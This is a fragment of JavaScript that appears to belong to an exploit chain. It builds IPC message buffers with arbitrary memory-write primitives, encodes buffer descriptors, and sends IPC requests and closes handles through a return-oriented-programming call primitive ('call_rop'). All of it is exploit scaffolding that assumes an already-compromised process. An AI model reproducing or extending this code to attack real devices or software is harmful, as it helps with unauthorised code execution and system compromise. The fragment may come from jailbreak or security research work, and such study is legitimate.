function prepPacket(buf, tag0, tag1, words) {
    for (let i = 0n; i < 0x200n; i += 8n) write64(buf + i, 0n);
    write32(buf, BigInt(tag0 >>> 0));
    write32(buf + 4n, BigInt(tag1 >>> 0));
    for (const [off, v] of words) write32(buf + BigInt(off), BigInt(v >>> 0));
}

function writeXDesc(buf, descOffset, dataAddr, dataSize, descriptorIndex) {
    descriptorIndex = descriptorIndex || 0;
    const addrLow = Number(dataAddr & 0xFFFFFFFFn);
    const addr3235 = Number(dataAddr >> 32n & 0xFn);
    const addr3638 = Number(dataAddr >> 36n & 0x7n);
    const word0 = dataSize << 16 | addr3638 << 6 | addr3235 << 12 | descriptorIndex & 63;
    write32(buf + BigInt(descOffset), BigInt(word0 >>> 0));
    write32(buf + BigInt(descOffset + 4), BigInt(addrLow >>> 0));
}

function sendIPC(handle, buf) {
    return call_rop(IPC_SEND_DISPATCHER, BigInt(handle), buf, 0x1000n);
}

function closeHandle(handle) {
    return call_rop(F_CloseHandle, BigInt(handle));
}
